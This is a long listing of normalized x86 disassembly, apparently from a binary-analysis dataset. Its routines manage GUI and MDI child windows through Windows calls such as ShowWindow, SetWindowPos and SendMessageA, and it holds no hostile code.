mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4507d8
call sub_461b54
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_468704
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4499bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4686d4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44a218
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4686f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449a00
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4686c8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_465298
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_465298
jmp r-xdata
sub_466ef9
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46ad0c
call sub_403a5c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_4686d4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4499bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4686c8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449a00
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_468704
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4499bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4686d4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467390
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44a218
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4686f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449a00
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4686c8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_465298
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_465298
jmp r-xdata
sub_467295
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46ad0c
call sub_403a5c
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_465fe8
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44dcf8
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4507d8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467390
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4507d8
call sub_461b54
mov ebx eax
sub_4673dc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_467434
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4232d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467492
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403254
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_4674a0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403450
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4674cc
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46acf8
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403450
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_46766c
jmp r-xdata
mov eax ebx
call sub_467708
mov dl 0x1
mov eax ebx
call sub_465258
jmp r-xdata
sub_467570
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_464be4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_464c30
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_4675d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036f4#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403450
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_467708
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46768c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4676fa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467701
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_465ee4
sub_467724
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4679ec
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_448818
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_469bc4
xor edx edx
push ebp
push sub_4679cf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_41a64c
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_468bf4
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_461a04
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4679ad
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_467674
xor edx edx
push ebp
push sub_46790c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4675d4
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46aa78
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4507d8
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467913
mov eax [ ebp - 0x4 ]
call sub_46766c
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_467913
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4679b7
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_468bf4
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_468bf4
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_41a5c8
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_41a714
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_461ab8
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4679fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4679fc
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44d494
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_467a6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_4679fc
pop ecx
mov eax [ esi + 0x34 ]
call sub_45c2f4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_45c304
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_467af0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44eaf0
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403450
sub_467b14
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403450
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_467b44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_467b14
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_467b44
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44d494
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467bc0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_467b14
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_467b14
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_467b44
pop ecx
test al al
je r-xdata
sub_467c14
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403450
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_467c44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_467c14
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_467c44
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44d494
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467cc0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_467c14
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_467c14
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_467c44
pop ecx
test al al
je r-xdata
sub_467d14
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_41a5d0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_456484
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_467d68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_467d14
pop ecx
test al al
jne r-xdata
